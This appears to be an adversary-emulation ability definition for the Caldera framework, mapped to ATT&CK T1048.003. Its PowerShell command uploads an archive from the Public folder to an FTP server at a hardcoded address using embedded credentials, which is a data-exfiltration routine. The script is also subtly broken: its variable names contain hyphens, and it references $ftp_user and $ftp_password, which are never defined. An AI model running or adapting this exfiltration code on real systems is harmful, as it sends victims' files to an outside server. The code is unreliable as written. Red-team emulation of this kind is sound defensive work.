- name: copy compressed archive to ftp server
  description: This abilities copy a file to a FTP server
  tactic: exfiltration
  technique_id: T1048.003
  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
  executors:
  - payloads: []
    platform: windows
    name: psh
    cleanup: []
    parsers: []
    command: '$SourceFile = "data.zip";

      $SourceDirectory = "$env:PUBLIC\";

      $FullPathFile=$SourceDirectory+$SourceFile;

      $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$SourceFile";

      $ftp-server-url="ftp://192.168.0.102";

      $ftp-server-port="2222";

      $ftp-user="caldera_user";

      $ftp-password="caldera";

      $colomn=":";

      $slash="/";


      $ftp = [System.Net.FtpWebRequest]::Create("$ftp-server-url$colomn$ftp-server-port$slash$RemoteName");

      $ftp = [System.Net.FTPWebRequest]$ftp;

      $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;

      $ftp.Credentials = New-Object System.Net.NetworkCredential("$ftp_user", "$ftp_password");


      $ftp.UseBinary = $true;

      $ftp.UsePassive = $true;

      $content = gc -encoding Byte $FullPathFile;

      $ftp.ContentLength = $content.Length;


      $requestStream = $ftp.GetRequestStream();

      $requestStream.Write($content, 0, $content.Length);


      $requestStream.Close();

      $requestStream.Dispose();'
    timeout: '60'
  repeatable: false
  additional_info: {}
  privilege: ''
  singleton: true
  buckets: []
  requirements: []
  access: {}
  cleanup: []
  id: ftp_archive_exfiltration
